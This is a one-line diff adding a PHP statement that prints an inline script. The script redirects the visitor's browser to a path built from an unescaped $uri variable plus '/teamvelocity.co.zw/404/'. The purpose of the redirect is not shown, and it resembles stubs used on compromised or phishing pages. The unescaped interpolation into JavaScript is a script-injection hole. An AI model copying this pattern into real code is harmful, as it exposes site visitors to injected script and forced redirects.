@@ -1,0 +1,1 @@
+<?php echo "<script>window.open('".$uri."/teamvelocity.co.zw/404/', '_self')</script>" ;?>
